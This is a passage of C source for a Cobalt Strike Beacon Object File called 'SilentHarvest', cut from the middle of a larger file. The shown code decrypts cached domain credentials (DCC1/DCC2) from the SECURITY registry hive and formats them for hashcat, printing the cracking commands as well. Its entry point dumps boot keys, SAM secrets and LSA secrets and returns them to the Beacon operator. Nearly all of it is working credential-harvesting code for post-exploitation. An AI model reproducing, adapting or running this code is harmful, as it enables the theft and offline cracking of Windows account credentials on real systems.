        {
            _swprintf(HashPrefix, L"$DCC1$");
            BeaconFormatPrintf(&pHashcatBuf, "\nCrack the following with: hashcat -m 1100 hashes.txt wordlist.txt\n");            
        }

        else
        {
            dwIteration = (dwIteration > 10240) ? (dwIteration & ~0x3ff) : (dwIteration << 10);
            _swprintf(HashPrefix, L"$DCC2$%d#", dwIteration);
            BeaconFormatPrintf(&pHashcatBuf, "\nCrack the following with: hashcat -m 2100 hashes.txt wordlist.txt\n");  
        }
    }
    else
    {
        _swprintf(HashPrefix, L"$DCC2$%d#", dwIteration);        
        BeaconFormatPrintf(&pHashcatBuf, "\nCrack the following with: hashcat -m 2100 hashes.txt wordlist.txt\n");  
    }
    BeaconFormatPrintf(&pHashcatBuf, "=================================================================\n");  

    // Retrieve array of KEY_VALUE_BASIC_INFORMATION structs representing the cached domain user logins. FALSE == Values
    if (!(pKVBI = GetKBIs(L"\\Registry\\Machine\\SECURITY\\Cache", &dwNumVals, FALSE)))
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to enumerate SECURITY Cache values\n", __func__);
        goto cleanup;  
    }

    // Allocate buffers
    pCacheVals = calloc(dwNumVals, sizeof(PVOID));

    // Loop through and collect the values from the cache
    for (DWORD value = 0; value < dwNumVals; value++)
    {
        // Assign ptr for ease
        pCacheValueInfo = (PKEY_VALUE_BASIC_INFORMATION)PADD(pKVBI, value * szKvbi);

        // We want all NL$ values except NL$Control + NL$IterationCount
        if (wcsstr(pCacheValueInfo->Name, L"NL$") && !wcsstr(pCacheValueInfo->Name, L"Control") && !wcsstr(pCacheValueInfo->Name, L"IterationCount"))
        {
            // Query and store the value
            if (!(pCacheVals[value] = (PMSCACHE_ENTRY)GetRegValue(hKey, pCacheValueInfo->Name, &dwRegValLen)))
            {
                BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to retrieve registry value for index: %u\n", __func__, value);
                goto cleanup;
            }

            // There can be blank cache entries, so check whether the first 16 bytes are populated before we try to decrypt
            if ( memcmp(pCacheVals[value], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16) != 0 )
            {
                // Calculate length of encrypted data + pad to 16-byte boundary so we can use CBC (mimikatz implements CTS)
                dwEncDataLen = (dwRegValLen - FIELD_OFFSET(MSCACHE_ENTRY, enc_data) + 15) & ~15;        
                pMSCACHE_DATA = calloc(1, dwEncDataLen);         
                if(!DecryptAES(pNLKMKey->Secret, 16, pCacheVals[value]->iv, 16, pCacheVals[value]->enc_data, dwEncDataLen, (PUCHAR)pMSCACHE_DATA, BCRYPT_CHAIN_MODE_CBC))
                {
                    BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to decrypt cached user login\n", __func__);
                    goto cleanup;
                }

                // Parse username and domain
                UserEntry.UserName.Buffer = PADD(pMSCACHE_DATA, sizeof(MSCACHE_DATA));
                UserEntry.UserName.Length = pCacheVals[value]->szUserName;
                UserEntry.Domain.Buffer = PADD(UserEntry.UserName.Buffer, SIZE_ALIGN(pCacheVals[value]->szUserName, 4));
                UserEntry.Domain.Length = pCacheVals[value]->szDomainName;
                
                // Report cached user
                BeaconFormatPrintf(&pOutBuf, "%.*ls\\%.*ls\n", UserEntry.Domain.Length / sizeof(WCHAR), UserEntry.Domain.Buffer, UserEntry.UserName.Length / sizeof(WCHAR), UserEntry.UserName.Buffer);
                bHashcatOut = TRUE;

                // DCC1 output
                if (wcsstr(HashPrefix, L"DCC1") != 0)
                    BeaconFormatPrintf(&pHashcatBuf, "%.*ls:", UserEntry.Domain.Length / sizeof(WCHAR), UserEntry.Domain.Buffer, UserEntry.UserName.Length / sizeof(WCHAR), UserEntry.UserName.Buffer);
                // DCC2 output
                else
                    BeaconFormatPrintf(&pHashcatBuf, "%ls%.*ls#", HashPrefix, UserEntry.UserName.Length / sizeof(WCHAR), UserEntry.UserName.Buffer);

                // Write hash
                for (DWORD b = 0; b < LM_NTLM_HASH_LENGTH; b++)
                    BeaconFormatPrintf(&pHashcatBuf, "%02x", ((PMSCACHE_DATA)pMSCACHE_DATA)->mshashdata[b]);
                BeaconFormatPrintf(&pHashcatBuf, "\n");

                // Prepare for next loop
                SizeAndFreeBuffer((PPVOID)&pMSCACHE_DATA);
            }
        }
    }

    // Close cache key
    CloseHandleAndWipePointer((PHANDLE)&hKey);

    // If we reach the end, set status success
    bSuccess = TRUE;

cleanup:
    // Wipe sensitive stack values
    memset(MachineHash, 0, 16);

    // Wipe sensitive heap values and free allocations
    if (pDecryptedLsaBuf)
        SizeAndFreeBuffer((PPVOID)&pDecryptedLsaBuf); 
    if (pNLKMKey)
        SizeAndFreeBuffer((PPVOID)&pNLKMKey);
    if (pMSCACHE_DATA)
        SizeAndFreeBuffer((PPVOID)&pMSCACHE_DATA);  
    if (pdwIterationVal)
        SizeAndFreeBuffer((PPVOID)&pdwIterationVal);
    if (pSecretKeys)
        SizeAndFreeBuffer((PPVOID)&pSecretKeys);
    if (pDomain)
        SizeAndFreeBuffer((PPVOID)&pDomain);
    if (pHostname)
        SizeAndFreeBuffer((PPVOID)&pHostname);
    if (pCacheVals)
    {
        for (DWORD i = 0; i < dwNumVals; i++)
            if (pCacheVals[i])
                SizeAndFreeBuffer((PPVOID)&pCacheVals[i]);

        SizeAndFreeBuffer((PPVOID)&pCacheVals); 
    }
    if (pSecrets)
    {
        for (DWORD i = 0; i < dwNumKeys; i++)
            if (pSecrets[i])
                SizeAndFreeBuffer((PPVOID)&pSecrets[i]); 

        SizeAndFreeBuffer((PPVOID)&pSecrets); 
    }

    // Close other handles / keys
    if (hKey)
        CloseHandleAndWipePointer((PHANDLE)&hKey);

    return bSuccess;
}

VOID go (char* args, int length)
{
    // Initialize output buffers
    BeaconFormatAlloc(&pOutBuf, 0x20000);
    BeaconFormatAlloc(&pHashcatBuf, 0x10000);

    // Ensure SeBackupPrivilege is enabled
    if (!IsPrivilegeEnabled())
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: You must be an Administrator and have the SeBackupPrivilege enabled in your token to use this BOF\n", __func__);
        goto cleanup;
    }

    // Get Boot keys
    if (!DumpBootKeys())
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to dump Boot Keys\n", __func__);
        goto cleanup;    
    }

    // Dump SAM secrets
    if (!DumpSamSecrets())
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to dump SAM secrets\n", __func__);

    // Dump LSA secrets
    if (!DumpSecuritySecrets())
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to dump SECURITY secrets\n", __func__);

cleanup:
    // Wipe sensitive globals values
    memset(BootKey, 0, 16);
    memset(EncBootKey, 0, 16);

    // Return output
    if (bHashcatOut)
        BeaconPrintf(CALLBACK_OUTPUT, "%s%s\nSilentHarvest Complete.", BeaconFormatToString(&pOutBuf, NULL), BeaconFormatToString(&pHashcatBuf, NULL));
    else
        BeaconPrintf(CALLBACK_OUTPUT, "%s\nSilentHarvest Complete.", BeaconFormatToString(&pOutBuf, NULL));

    // Free buffers
    BeaconFormatFree(&pOutBuf);
    BeaconFormatFree(&pHashcatBuf);

    return;
}